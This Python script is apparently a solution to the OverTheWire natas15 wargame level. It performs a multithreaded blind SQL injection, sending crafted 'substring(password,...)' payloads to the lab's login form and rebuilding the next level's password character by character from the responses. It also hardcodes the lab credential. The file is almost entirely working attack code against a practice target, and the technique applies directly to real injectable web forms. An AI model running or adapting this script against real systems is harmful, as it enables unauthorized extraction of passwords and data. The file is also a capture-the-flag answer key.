import threading
from threading import Thread
import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = 'W03569acehijmnpqtwBEHINOR'
result = ["","","","","","","","","","","","","","","","" ,"","","","","","","","","","","","","","","",""]
total = 32		#32 ~ 17s ; 16 ~ 30s ; 8 > 1p ,note: tang ca mang result neu muon tang so luong
section = (int)(32/total)

def attack(a,b):
    passwd = ''
    for i in range(a,b):
     for char in filtered:
        payload = {'username' : 'natas16" AND BINARY substring(password,'+ str(i) + ',1) ="'+char}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = payload)
        if 'exists' in r.text :
            passwd = passwd + char           
            break
    global result
    result[((int)((b-1)/section))-1]=passwd
    #print(' : '+result[((int)((b-1)/section))-1])

def mti_tak():
    threads = []
    for i in range(0,total):
       t = Thread(target=attack, args=(1+section*i,section*(i+1)+1))
       t.start()
       threads.append(t)
    for t in threads:
     t.join()

if __name__ == "__main__":
    mti_tak()

    passwd=""
    for i in range(0,total):    
        passwd+=result[i];
    print(passwd)